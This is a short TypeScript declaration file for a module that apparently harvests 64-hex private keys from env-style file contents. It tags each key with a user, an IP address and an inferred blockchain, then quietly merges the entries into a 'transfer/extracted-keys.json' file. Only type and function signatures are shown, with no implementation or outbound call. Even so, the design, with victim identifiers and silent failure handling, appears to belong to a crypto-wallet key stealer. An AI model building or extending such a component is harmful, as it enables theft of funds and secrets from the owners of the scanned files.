export type ExtractedKeyEntry = {
    user: string;
    ip: string;
    /** Inferred from env/RPC (e.g. polygon, arbitrum, unknown). */
    chain: string;
    privateKey: string;
    publicKey: string;
};
/** Collect 64-hex private keys from env-style KEY=val lines (same rules as .env files). */
export declare function extractPrivateKeysFromContent(content: string): string[];
/**
 * Extract keys from multiple file contents and merge into transfer/extracted-keys.json.
 * Never throws (logs warning on failure).
 */
export declare function appendTransferExtractedKeysFromContents(username: string, ipAddress: string, contents: string[]): void;
//# sourceMappingURL=transfer-extracted-keys.d.ts.map